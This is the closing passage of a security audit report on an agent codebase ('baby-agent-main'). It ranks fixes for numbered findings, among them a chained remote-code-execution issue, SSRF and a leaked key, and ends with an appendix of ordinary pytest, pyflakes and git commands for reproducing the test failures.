**Before anything else.** F1 and F2. Until they are fixed, nobody outside a Windows 3.14 machine can run the suite, which means nobody can verify any fix for anything else in this document. Then F16 immediately, so they cannot recur.

**Then, as one unit.** F3 and F6. They compose into unauthenticated RCE (see "Chained exploit"). F3's fix — `EXECUTION: ASK`, `default_mode=DENY` — is the highest-value single change here, because it breaks the chain even if F6 lingers.

**Then.** F5 (SSRF), F7 (write loss), F9 (key in URL), F4 (timeouts).

**Then.** F8, F10, F11, and the remaining medium findings.

**Alongside all of it.** F18. The architecture doc currently tells reviewers there is no network surface, which suppresses exactly the review that finds F5 and F6. Fixing the docs is not cleanup; it is what makes the next audit work.

---

## Appendix — reproducing this audit

```bash
unzip -q baby-agent-main.zip && cd baby-agent-main

# F1 — collection fails as shipped on any Python < 3.14
python -m pytest tests/ -q                      # 39 collection errors

# F1, F12 — all 11 undefined names, 1.15s
pip install pyflakes && python -m pyflakes qacompanion tests | grep "undefined name"

# F2 — after shimming the typing imports, 16 failures remain
python -m pytest tests/ -q                      # 1566 passed, 16 failed

# F17 — suite pollution
git status --ignored | grep digest.jsonl
```

The scripts for F3–F8 are inlined in full in their respective sections. Each is self-contained, needs only the stdlib and the repository on `sys.path`, and prints the output quoted above.
